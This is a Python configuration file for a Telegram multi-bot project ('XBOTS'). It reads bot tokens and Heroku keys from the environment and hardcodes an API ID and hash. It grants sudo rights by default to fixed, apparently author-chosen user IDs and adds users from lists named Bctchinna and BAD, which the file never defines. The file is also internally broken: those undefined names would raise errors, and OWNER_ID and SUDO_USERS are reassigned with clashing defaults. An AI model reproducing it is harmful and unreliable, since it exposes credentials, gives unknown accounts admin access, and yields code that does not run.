import os
from os import getenv

from decouple import config

# VALUES REQUIRED FOR XBOTS
API_ID = 18136872
API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME", None)
HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)

BOT_TOKEN = getenv("BOT_TOKEN", default=None)
BOT_TOKEN2 = getenv("BOT_TOKEN2", default=None)
BOT_TOKEN3 = getenv("BOT_TOKEN3", default=None)
BOT_TOKEN4 = getenv("BOT_TOKEN4", default=None)
BOT_TOKEN5 = getenv("BOT_TOKEN5", default=None)
BOT_TOKEN6 = getenv("BOT_TOKEN6", default=None)
BOT_TOKEN7 = getenv("BOT_TOKEN7", default=None)
BOT_TOKEN8 = getenv("BOT_TOKEN8", default=None)
BOT_TOKEN9 = getenv("BOT_TOKEN9", default=None)
BOT_TOKEN10 = getenv("BOT_TOKEN10", default=None)

SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="5518687442").split()))
for x in Bctchinna:
    SUDO_USERS.append(x)
OWNER_ID = int(getenv("OWNER_ID", default="5518687442"))
SUDO_USERS.append(OWNER_ID)

START_MESSAGE = getenv("START_MESSAGE", None)

PING_PIC = getenv("PING_PIC", None)

START_PIC = getenv("START_PIC", None)

OWNER_ID = int(getenv("OWNER_ID", default="7009601543"))
HELP_MSG = getenv("HELP_MSG", None)
HELP_PIC = getenv("HELP_PIC", "https://telegra.ph/file/c26f985c3f59004bc9927.jpg")
LOG_CHANNEL = getenv("LOG_CHANNEL", None)

HANDLER = getenv("HANDLER", "/")

# SUDO and OWNER logic
SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "7762101994").split()))
SUDO_USERS.extend(BAD)  # Add users from your custom list
OWNER_ID = int(os.getenv("OWNER_ID", "7762101994"))
if OWNER_ID not in SUDO_USERS:
    SUDO_USERS.append(OWNER_ID)
SUDO_USERS = list(set(SUDO_USERS))  # remove duplicates
